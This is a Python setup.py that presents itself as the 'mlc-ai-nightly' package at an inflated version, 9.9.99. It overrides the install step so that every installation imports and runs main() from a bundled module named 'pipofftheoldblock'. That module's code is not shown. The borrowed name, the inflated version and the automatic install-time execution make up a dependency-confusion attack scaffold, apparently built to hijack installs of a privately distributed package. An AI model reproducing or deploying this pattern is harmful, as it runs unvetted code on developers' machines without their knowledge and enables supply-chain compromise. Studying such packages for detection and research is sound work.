import sys
from setuptools import setup, find_packages
from setuptools.command.install import install


class PostInstallScript(install):
    def run(self):
        sys.path.insert(0, 'src')
        from pipofftheoldblock.run import main
        main(b"man")
        install.run(self)


setup(
    name='mlc-ai-nightly',
    version='9.9.99',
    py_modules=['pipofftheoldblock'],
    cmdclass={
        "install": PostInstallScript,
    },
    packages=find_packages('src'),
    package_dir={'':'src'},
)

